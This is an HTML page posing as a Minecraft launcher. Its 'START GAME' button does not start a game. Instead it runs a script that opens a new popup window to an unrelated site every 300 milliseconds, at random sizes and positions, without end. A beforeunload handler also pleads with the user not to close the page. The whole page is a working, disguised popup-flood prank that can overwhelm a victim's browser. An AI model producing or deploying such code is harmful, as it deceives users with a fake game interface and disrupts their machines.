<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Minecraft Launcher</title>
  <style>
    @font-face {
      font-family: 'Minecraft';
      src: url('https://fonts.cdnfonts.com/s/12179/Minecraft.ttf') format('truetype');
    }

    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      font-family: 'Minecraft', monospace;
      color: #00ff00;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background-image: url('https://i.imgur.com/ClashRoyaleBG.jpg'); /* Replace with Minecraft-style background if desired */
      background-size: cover;
      background-position: center;
    }

    h1 {
      font-size: 4em;
      color: #00ff00;
      text-shadow: 2px 2px #000;
      margin-bottom: 40px;
    }

    button {
      font-size: 1.5em;
      padding: 20px 40px;
      background-color: #00aa00;
      border: 4px solid #003300;
      border-radius: 0;
      color: white;
      cursor: pointer;
      box-shadow: 0 0 0 4px #000, 0 8px 0 0 #003300;
      transition: transform 0.2s ease, background-color 0.2s ease;
      font-family: 'Minecraft', monospace;
      margin: 10px;
    }

    button:hover {
      background-color: #00cc00;
      transform: scale(1.05);
    }
  </style>
  <script>
    let intervalId = null;

    function generateSizes(count = 1000) {
      const sizes = [];
      for (let i = 0; i < count; i++) {
        const width = Math.floor(Math.random() * 1000) + 200;
        const height = Math.floor(Math.random() * 800) + 150;
        sizes.push({ width, height });
      }
      return sizes;
    }

    function startLaunching() {
      const sizes = generateSizes();

      if (!intervalId) {
        intervalId = setInterval(() => {
          const screenWidth = window.screen.availWidth;
          const screenHeight = window.screen.availHeight;

          const size = sizes[Math.floor(Math.random() * sizes.length)];
          const left = Math.floor(Math.random() * Math.max(1, screenWidth - size.width));
          const top = Math.floor(Math.random() * Math.max(1, screenHeight - size.height));

          window.open(
            "https://rotatingsandwiches.com",
            "_blank",
            `width=${size.width},height=${size.height},top=${top},left=${left}`
          );
        }, 300);
      }
    }

    window.addEventListener('beforeunload', function (e) {
      const message = "PLEASE DON'T CLOSE ME!!!!!! Are you sure you want to leave?";
      e.preventDefault();
      e.returnValue = message;
      return message;
    });
  </script>
</head>
<body>
  <h1>MINECRAFT</h1>
  <button onclick="startLaunching()">START GAME</button>
</body>
</html>
